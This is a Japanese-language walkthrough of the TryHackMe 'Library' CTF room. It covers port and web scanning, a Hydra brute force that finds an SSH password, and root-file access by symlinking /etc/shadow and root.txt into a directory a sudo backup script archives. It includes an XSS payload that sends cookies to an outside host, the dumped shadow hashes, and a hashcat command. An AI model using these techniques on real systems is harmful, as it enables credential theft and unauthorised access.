# Library CTF

https://tryhackme.com/r/room/bsidesgtlibrary

ブラウザで開くとブログページが表示される。コメントをポストするフォームがある。  
ポストしても画面には表示されない。

## 偵察

### ポートスキャン

```shell
$ sudo nmap -sS $TARGET            
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 19:13 EST
Nmap scan report for 10.10.212.93
Host is up (0.25s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 3.38 seconds
                                                                                                                                                                                                                                           
$ sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 19:13 EST
Nmap scan report for 10.10.212.93
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.70 seconds
```

SSH, HTTP

### whatweb

```shell
$ whatweb -v http://$TARGET
WhatWeb report for http://10.10.212.93
Status    : 200 OK
Title     : Welcome to  Blog - Library Machine
IP        : 10.10.212.93
Country   : RESERVED, ZZ

Summary   : Apache[2.4.18], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)]

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.18 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ HTML5 ]
        HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Ubuntu Linux
        String       : Apache/2.4.18 (Ubuntu) (from server string)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Sun, 22 Dec 2024 00:15:16 GMT
        Server: Apache/2.4.18 (Ubuntu)
        Last-Modified: Sat, 24 Aug 2019 21:04:28 GMT
        ETag: "153f-590e344b14f00-gzip"
        Accept-Ranges: bytes
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 1905
        Connection: close
        Content-Type: text/html
```

### dirb

```shell
$ dirb http://$TARGET /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec 21 19:17:46 2024
URL_BASE: http://10.10.212.93/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.212.93/ ----
==> DIRECTORY: http://10.10.212.93/images/                                                                                                                                                                                                
+ http://10.10.212.93/index.html (CODE:200|SIZE:5439)                                                                                                                                                                                     
+ http://10.10.212.93/robots.txt (CODE:200|SIZE:33)                                                                                                                                                                                       
+ http://10.10.212.93/server-status (CODE:403|SIZE:300)                                                                                                                                                                                   
                                                                                                                                                                                                                                          
---- Entering directory: http://10.10.212.93/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
END_TIME: Sat Dec 21 19:37:19 2024
DOWNLOADED: 4612 - FOUND: 3
```

rockyou.txt
```text
User-agent: rockyou 
Disallow: /
```

http://10.10.212.93/server-status -> Forbidden

### nikto

```shell
$ nikto -h http://$TARGET
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.10.212.93
+ Target Hostname:    10.10.212.93
+ Target Port:        80
+ Start Time:         2024-12-21 19:40:35 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ /: Server may leak inodes via ETags, header found with file /, inode: 153f, size: 590e344b14f00, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ OPTIONS: Allowed HTTP Methods: POST, OPTIONS, GET, HEAD .
```

### XSS
とりあえずコメントにXSSを仕掛けてみる
```shell
<script>document.write('<img src="http://10.2.22.182:1234/' + document.cookie + '">')</script>
```
反応なし。

### ssh
Posted on June 29th 2009 by meliodas - 3 comments  
と書かれているので、meliodas　というユーザーがいるかもしれない。

```shell
 $ hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.212.93 ssh -t 30
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-21 20:58:41
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 30 tasks per 1 server, overall 30 tasks, 14344399 login tries (l:1/p:14344399), ~478147 tries per task
[DATA] attacking ssh://10.10.212.93:22/
[22][ssh] host: 10.10.212.93   login: meliodas   password: iloveyou1
[STATUS] 14344399.00 tries/min, 14344399 tries in 00:01h, 9 to do in 00:01h, 21 active
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 9 final worker threads did not complete until end.
[ERROR] 9 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-21 21:00:18
```
login: meliodas   password: iloveyou1

```shell
$ ssh meliodas@10.10.212.93 
meliodas@10.10.212.93's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Sat Aug 24 14:51:01 2019 from 192.168.15.118
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat ./user.txt 
6d488cbb3f1
```
flag1ゲット。

## 権限昇格
```shell
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
sudoで /home/meliodas/bak.py を実行できる。

```shell
meliodas@ubuntu:~$ ls -al bak.py 
-rw-r--r-- 1 root root 353 Aug 23  2019 bak.py

meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

/var/www/html のバックアップを /var/backups/website.zip に作っている

shadow のシンボリックリンクを /var/www/html/Blog/ に作る
```shell
meliodas@ubuntu:~$ ln -s /etc/shadow /var/www/html/Blog/
```

バックアップ実行
```shell
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
meliodas@ubuntu:~$ cp /var/backups/website.zip ./
meliodas@ubuntu:~$ unzip ./website.zip 
Archive:  ./website.zip
  inflating: var/www/html/index.html  
  inflating: var/www/html/Blog/logo.png  
  inflating: var/www/html/Blog/robots.txt  
  inflating: var/www/html/Blog/index.html  
  inflating: var/www/html/Blog/shadow  
  inflating: var/www/html/Blog/master.css  
  inflating: var/www/html/Blog/images/intro_background.png  
  inflating: var/www/html/Blog/images/nav_background.png  
  inflating: var/www/html/Blog/images/sidebar_background.png  
  inflating: var/www/html/Blog/images/sidebar_section_background.png  
meliodas@ubuntu:~$ cat ./var/www/html/Blog/shadow 
root:$6$Up1rU8wY$PVafdCYkXwIbn1wENdACQPYjVVqood9LBZCbSkBu1DOFBHWlEOc3nuRDdB766kW/q1f8BNRCmhXWS3551Ke0y1:18132:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18132:0:99999:7:::
uuidd:*:18132:0:99999:7:::
meliodas:$6$y7ENFHG2$ezQqzS6YlOGmui43EjlYCDLk.I6ancx6Atxr7kEOG9hyTRywUOnTXvjZV8RM2d8Fhj/wfEDa07102RQqkmUi./:18132:0:99999:7:::
sshd:*:18132:0:99999:7:::
```

shadow入手。  
root:$6$Up1rU8wY$PVafdCYkXwIbn1wENdACQPYjVVqood9LBZCbSkBu1DOFBHWlEOc3nuRDdB766kW/q1f8BNRCmhXWS3551Ke0y1:18132:0:99999:7:::

```shell
$ echo '$6$Up1rU8wY$PVafdCYkXwIbn1wENdACQPYjVVqood9LBZCbSkBu1DOFBHWlEOc3nuRDdB766kW/q1f8BNRCmhXWS3551Ke0y1' > hash 
$ hashcat -m 1800 hash /usr/share/wordlists/rockyou.txt
```

SHA-512であることもあり、すぐに割れない。  
待っているとき、目的のファイルが root.txt であることが分かっているので、/root/root.txt を直接バックアップに含めることも可能なのではないかと考えた。

```shell
meliodas@ubuntu:~$ ln -s /root/root.txt /var/www/html/Blog
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
meliodas@ubuntu:~$ cp /var/backups/website.zip ./
meliodas@ubuntu:~$ unzip ./website.zip 
Archive:  ./website.zip
  inflating: var/www/html/index.html  
  inflating: var/www/html/Blog/logo.png  
  inflating: var/www/html/Blog/robots.txt  
  inflating: var/www/html/Blog/index.html  
  inflating: var/www/html/Blog/root.txt  
  inflating: var/www/html/Blog/master.css  
  inflating: var/www/html/Blog/images/intro_background.png  
  inflating: var/www/html/Blog/images/nav_background.png  
  inflating: var/www/html/Blog/images/sidebar_background.png  
  inflating: var/www/html/Blog/images/sidebar_section_background.png  
meliodas@ubuntu:~$ cat ./var/www/html/Blog/root.txt
e8c8c6c256c
```

（おもしろくないけど）ゲット！

## 振り返り
- これ見よがしなPOSTフォームは囮だった。
- 最初、SSH hydra を実行したときは毎分１００件弱しか進まなかったのに、-t 30 を付けたら一瞬で終わった。今後はデフォルトで付けることにする。
- /root フォルダに何が入っているか見えないのに root.txt というファイル名決め打ちで攻略するのはおもしろくなかった。これに限らず、パスワードの文字数とか、THMのWebサイト側のメタ情報に頼るパターンは嫌い。
